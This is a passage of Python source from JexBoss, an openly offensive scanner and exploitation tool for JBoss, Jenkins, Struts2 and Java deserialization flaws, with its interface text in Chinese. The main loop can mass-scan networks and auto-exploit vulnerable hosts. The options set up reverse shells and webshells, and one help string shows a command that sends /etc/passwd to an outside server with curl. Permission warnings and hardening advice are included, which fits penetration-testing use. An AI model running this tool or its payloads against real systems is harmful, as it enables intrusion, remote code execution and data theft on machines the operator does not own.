     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +

     BLUE + "\n\n 使用DNS Lookup测试Java反序列化漏洞:\n" +
     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com" +

     BLUE + "\n\n 检测Jenkins CLI反序列化漏洞 (CVE-2015-5317):\n"+
     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins"+

     BLUE + "\n\n 检测Apache Struts2漏洞 (CVE-2017-5638):\n" +
     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2\n" +

     BLUE + "\n\n 自动扫描模式，您必须以CIDR格式提供网络，\n"
   " 端口列表和存储结果的文件名:\n" +
    GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 \n"
            "    -results report_auto_scan.log" +

    BLUE + "\n\n 文件扫描模式，您必须提供包含主机列表的文件名\n"
           " (每行一个主机) 和存储结果的文件名:\n" +
    GREEN + "\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log\n" + ENDC)
    return usage


def network_args(string):
    try:
        if version_info[0] >= 3:
            value = ipaddress.ip_network(string)
        else:
            value = ipaddress.ip_network(unicode(string))
    except:
        msg = "%s 不是CIDR格式的网络地址。" % string
        logging.error("%s is not a network address in CIDR format." % string)
        raise argparse.ArgumentTypeError(msg)
    return value


def main():
    """
    交互式运行。当模块自行运行时调用。
    :return: 退出代码
    """
    # 检查更新
    if not gl_args.disable_check_updates:
        updates = _updates.check_updates()
        if updates:
            print_and_flush(BLUE + BOLD + "\n\n * 有可用更新，建议在继续前更新。\n" +
                                          "   是否立即更新？")
            if not sys.stdout.isatty():
                print_and_flush("   是/否? ", same_line=True)
                pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
            else:
                pick = input("   是/否? ").lower() if version_info[0] >= 3 else raw_input("   是/否? ").lower()

            print_and_flush(ENDC)
            if pick != "no":
                updated = _updates.auto_update()
                if updated:
                    print_and_flush(GREEN + BOLD + "\n * JexBoss 已成功更新。请重新运行以享受更新。\n" +ENDC)
                    exit(0)
                else:
                    print_and_flush(RED + BOLD + "\n\n * 更新 JexBoss 时出错。请重试..\n" +ENDC)
                    exit(1)

    vulnerables = False
    # 独立模式下的漏洞检查
    if gl_args.mode == 'standalone':
        url = gl_args.host
        scan_results = check_vul(url)
        # 对JBoss漏洞执行利用
        for vector in scan_results:
            if scan_results[vector] == 200 or scan_results[vector] == 500:
                vulnerables = True
                if gl_args.auto_exploit:
                    auto_exploit(url, vector)
                else:

                    if vector == "Application Deserialization":
                        msg_confirm = "   如果成功，此操作将提供反向SHELL。您必须输入\n" \
                                      "   监听服务器的IP地址和端口。\n"
                    else:
                        msg_confirm = "   如果成功，此操作将提供简单的命令SHELL来在\n" \
                                      "   服务器上执行命令。\n"

                    print_and_flush(BLUE + "\n\n * 是否尝试通过 \"" +
                          BOLD + vector + NORMAL + "\" 运行自动化利用？\n" +
                          msg_confirm +
                          RED + "   仅在您拥有权限时继续！" + ENDC)
                    if not sys.stdout.isatty():
                        print_and_flush("   是/否? ", same_line=True)
                        pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
                    else:
                        pick = input("   是/否? ").lower() if version_info[0] >= 3 else raw_input("   是/否? ").lower()

                    if pick == "yes":
                        auto_exploit(url, vector)

    # 自动扫描模式下的漏洞检查
    elif gl_args.mode == 'auto-scan':
        file_results = open(gl_args.results, 'w')
        file_results.write("JexBoss 扫描模式报告\n\n")
        for ip in gl_args.network.hosts():
            if gl_interrupted: break
            for port in gl_args.ports.split(","):
                if check_connectivity(ip, port):
                    url = "{0}:{1}".format(ip,port)
                    ip_results = check_vul(url)
                    for key in ip_results.keys():
                        if ip_results[key] == 200 or ip_results[key] == 500:
                            vulnerables = True
                            if gl_args.auto_exploit:
                                result_exploit = auto_exploit(url, key)
                                if result_exploit:
                                    file_results.write("{0}:\t[已通过 {1} 利用]\n".format(url, key))
                                else:
                                    file_results.write("{0}:\t[未能通过 {1} 利用]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[可能对 {1} 易受攻击]\n".format(url, key))

                            file_results.flush()
                else:
                    print_and_flush (RED+"\n * 主机 %s:%s 无响应。"% (ip,port)+ENDC)
        file_results.close()
    # 文件扫描模式下的漏洞检查
    elif gl_args.mode == 'file-scan':
        file_results = open(gl_args.out, 'w')
        file_results.write("JexBoss 扫描模式报告\n\n")
        file_input = open(gl_args.file, 'r')
        for url in file_input.readlines():
            if gl_interrupted: break
            url = url.strip()
            ip = str(parse_url(url)[2])
            port = parse_url(url)[3] if parse_url(url)[3] != None else 80
            if check_connectivity(ip, port):
                url_results = check_vul(url)
                for key in url_results.keys():
                    if url_results[key] == 200 or url_results[key] == 500:
                        vulnerables = True
                        if gl_args.auto_exploit:
                            result_exploit = auto_exploit(url, key)
                            if result_exploit:
                                file_results.write("{0}:\t[已通过 {1} 利用]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[未能通过 {1} 利用]\n".format(url, key))
                        else:
                            file_results.write("{0}:\t[可能对 {1} 易受攻击]\n".format(url, key))

                        file_results.flush()
            else:
                print_and_flush (RED + "\n * 主机 %s:%s 无响应。" % (ip, port) + ENDC)
        file_results.close()

    # 结果总结
    if vulnerables:
        banner()
        print_and_flush(RED + BOLD+" 结果: 可能存在安全漏洞的服务器！" + ENDC)
        if gl_args.mode  == 'file-scan':
            print_and_flush(RED + BOLD + " ** 更多信息请查看文件 {0} **".format(gl_args.out) + ENDC)
        elif gl_args.mode == 'auto-scan':
            print_and_flush(RED + BOLD + " ** 更多信息请查看文件 {0} **".format(gl_args.results) + ENDC)

        print_and_flush(GREEN + " ---------------------------------------------------------------------------------\n"
             +BOLD+   " 建议: \n" +ENDC+
              GREEN+  " - 移除未使用的Web控制台和服务，例如:\n"
                      "    $ rm web-console.war http-invoker.sar jmx-console.war jmx-invoker-adaptor-server.sar admin-console.war\n"
                      " - 使用反向代理 (如 nginx, apache, F5)\n"
                      " - 仅通过反向代理限制对服务器的访问 (例如 DROP INPUT POLICY)\n"
                      " - 在 \"deploy\" 和 \"management\" 目录中搜索利用痕迹。\n"
                      " - 不要信任来自用户的序列化对象\n"
                      " - 如果可能，停止使用序列化对象作为输入！\n"
                      " - 如果需要处理序列化，考虑迁移到Gson库。\n"
                      " - 在反序列化前使用严格的白名单和Look-ahead[3]\n"
                      " - 对于viewState输入的快速（非最终）修复，将视图组件的状态\n"
                      "   存储在服务器端（这将增加堆内存消耗）: \n"
                      "      在web.xml中，将STATE_SAVING_METHOD的\"client\"参数改为\"server\"。\n"
                      " - 升级Apache Struts: https://cwiki.apache.org/confluence/display/WW/S2-045\n"
                      "\n 参考:\n"
                      "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                      "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                      "   [3] - https://www.ibm.com/developerworks/library/se-lookahead/\n"
                      "   [4] - https://www.owasp.org/index.php/Deserialization_of_untrusted_data\n"
                      "\n"
                      " - 如果可能，弃用此服务器！\n"
                      " ---------------------------------------------------------------------------------")
    else:
        print_and_flush(GREEN + "\n\n * 结果: \n" +
              "   服务器不易受测试的漏洞影响... :D\n" + ENDC)
    # 信息
    print_and_flush(ENDC + " * 信息: 审查、建议、更新等: \n" +
          "   https://github.com/joaomatosf/jexboss\n")

    print_and_flush(GREEN + BOLD + " * 捐赠: " + ENDC + "请考虑捐赠以帮助改进此工具，\n" +
          GREEN + BOLD + " * 比特币地址: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" )


print_and_flush(ENDC)

#banner()


if __name__ == "__main__":


    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        #description="JexBoss v%s: JBoss验证与漏洞利用工具" %__version,
        description=textwrap.dedent(RED1 +
               "\n # --- JexBoss: JBoss 验证与漏洞利用工具  --- #\n"
                 " |    及其他Java反序列化漏洞   | \n"
                 " |                                                    |\n"
                 " | @作者:  João Filho Matos Figueiredo                |\n"
                 " | @联系: joaomatosf@gmail.com                        |\n"
                 " |                                                   |\n"
                 " | @更新: https://github.com/joaomatosf/jexboss       |\n"
                 " #______________________________________________________#\n"
                 " @版本: " + __version__ + "\n" + help_usage()),
        epilog="",
        prog="JexBoss"
    )

    group_standalone = parser.add_argument_group('独立模式')
    group_advanced = parser.add_argument_group('高级选项 (在应用层利用JAVA反序列化时使用)')
    group_auto_scan = parser.add_argument_group('自动扫描模式')
    group_file_scan = parser.add_argument_group('文件扫描模式')

    # 可选参数 ---------------------------------------------------------------------------------------
    parser.add_argument('--version', action='version', version='%(prog)s ' + __version__)
    parser.add_argument("--auto-exploit", "-A", help="自动发送漏洞利用代码 (仅在您拥有权限时使用!!!)",
                        action='store_true')
    parser.add_argument("--disable-check-updates", "-D", help="禁用两项更新检查: 1) 由被利用服务器中的webshell执行\n"
                        "的更新检查 (http://webshell.jexboss.net/jsp_version.txt) 和 2) 由jexboss客户端执行\n"
                        "的更新检查 (http://joaomatosf.com/rnp/releases.txt)",
                        action='store_true')
    parser.add_argument('-mode', help="操作模式 (默认: standalone)", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
    parser.add_argument("--app-unserialize", "-j",
                        help="检查HTTP参数中的Java反序列化漏洞 (例如 javax.faces.ViewState, "
                             "oldFormData 等)", action='store_true')
    parser.add_argument("--servlet-unserialize", "-l",
                        help="检查Servlet中的Java反序列化漏洞 (如Invoker接口)",
                        action='store_true')
    parser.add_argument("--jboss", help="仅检查JBOSS向量。", action='store_true')
    parser.add_argument("--jenkins",  help="仅检查Jenkins CLI向量 (CVE-2015-5317)。", action='store_true')
    parser.add_argument("--struts2", help="仅检查Struts2 Jakarta Multipart解析器 (CVE-2017-5638)。", action='store_true')
    parser.add_argument("--jmxtomcat", help="检查Tomcat中的JMX JmxRemoteLifecycleListener (CVE-2016-8735 和 "
                                            "CVE-2016-3427)。注意: 默认情况下不会检查此漏洞。", action='store_true')

    parser.add_argument('--proxy', "-P", help="使用HTTP代理连接到目标URL (例如 -P http://192.168.0.1:3128)", )
    parser.add_argument('--proxy-cred', "-L", help="代理认证凭据 (例如 -L name:password)", metavar='用户名:密码')
    parser.add_argument('--jboss-login', "-J", help="用于在JBoss 5和JBoss 6中利用admin-console的JBoss登录凭据 "
                                                    "(默认: admin:admin)", metavar='用户名:密码', default='admin:admin')
    parser.add_argument('--timeout', help="连接超时前的等待秒数 (默认 3)", default=3, type=int)

    parser.add_argument('--cookies', help="为Struts 2漏洞利用指定Cookie。用于测试需要认证的功能。"
                                         "格式: \"名称1=值1; 名称2=值2\" (例如 --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\""
                        , type=str, metavar='名称=值')
    #parser.add_argument('--retries', help="连接超时时的重试次数 (默认 3)", default=3, type=int)

    # 高级参数 ---------------------------------------------------------------------------------------
    group_advanced.add_argument("--reverse-host", "-r", help="当在应用层利用Java反序列化漏洞时，"
                                                             "用于反向SHELL的远程主机地址和端口 "
                                                             "(目前仅支持*nix系统)"
                                                             "(例如 192.168.0.10:1331)", type=str, metavar='RHOST:RPORT')
    group_advanced.add_argument("--cmd", "-x",
                                help="在目标上运行的特定命令 (例如 curl -d @/etc/passwd http://your_server)"
                                     , type=str, metavar='命令')
    group_advanced.add_argument("--dns", help="为\"dns\" Gadget指定DNS查询", type=str, metavar='URL')
    group_advanced.add_argument("--windows", "-w", help="指定命令用于Windows系统 (cmd.exe)",
                                action='store_true')
    group_advanced.add_argument("--post-parameter", "-H", help="指定要查找并注入序列化对象的参数。"
                                                               "(例如 -H javax.faces.ViewState 或 -H oldFormData (<- 嗨 PayPal =X) 或其他)"
                                                               "(默认: javax.faces.ViewState)",
                                                                 default='javax.faces.ViewState', metavar='参数')
    group_advanced.add_argument("--show-payload", "-t", help="打印生成的payload。",
                                action='store_true')
    group_advanced.add_argument("--gadget", help="指定用于自动生成payload的Gadget类型。"
                                                 "(默认: commons-collections3.1 或 Jenkins 的 groovy1)",
                                    choices=['commons-collections3.1', 'commons-collections4.0', 'jdk7u21', 'jdk8u20', 'groovy1', 'dns'],
                                    default='commons-collections3.1')
    group_advanced.add_argument("--load-gadget", help="从文件提供您自己的gadget (RAW格式的Java序列化对象)",
                                metavar='文件名')
    group_advanced.add_argument("--force", "-F",
                                help="强制向-u参数指定的URL发送Java序列化gadgets。这将"
                                     "以多种格式 (例如 RAW, GZIPED 和 BASE64) 和不同的"
                                     "内容类型发送payload。",action='store_true')

    # 必需参数 ---------------------------------------------------------------------------------------
    group_standalone.add_argument("-host", "-u", help="要检查的主机地址 (例如 -u http://192.168.0.10:8080)",
                                  type=str)

    # 扫描模式参数 ---------------------------------------------------------------------------------------
    group_auto_scan.add_argument("-network", help="以CIDR格式检查的网络 (例如 10.0.0.0/8)",
                            type=network_args, default='192.168.0.0/24')
    group_auto_scan.add_argument("-ports", help="要检查的端口列表，用逗号分隔 "
                                                "(例如 8080,8443,8888,80,443)", type=str, default='8080,80')
    group_auto_scan.add_argument("-results", help="存储自动扫描结果的文件名", type=str,
                                 metavar='文件名', default='jexboss_auto_scan_results.log')

    group_file_scan.add_argument("-file", help="包含要扫描的主机列表的文件名 (每行一个主机)",
                                 type=str, metavar='主机列表文件')
    group_file_scan.add_argument("-out", help="存储文件扫描结果的文件名", type=str,
                                 metavar='结果文件', default='jexboss_file_scan_results.log')

    gl_args = parser.parse_args()

    if (gl_args.mode == 'standalone' and gl_args.host is None) or \
        (gl_args.mode == 'file-scan' and gl_args.file is None) or \
        (gl_args.gadget == 'dns' and gl_args.dns is None):
        banner()
        print (help_usage())
        exit(0)
    else:
        configure_http_pool()
        _updates.set_http_pool(gl_http_pool)
        _exploits.set_http_pool(gl_http_pool)
        banner()
        if gl_args.proxy and not is_proxy_ok():
            exit(1)
        if gl_args.gadget == 'dns': gl_args.cmd = gl_args.dns
        main()

if __name__ == '__testing__':
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    timeout = Timeout(connect=1.0, read=3.0)
    gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
    _exploits.set_http_pool(gl_http_pool)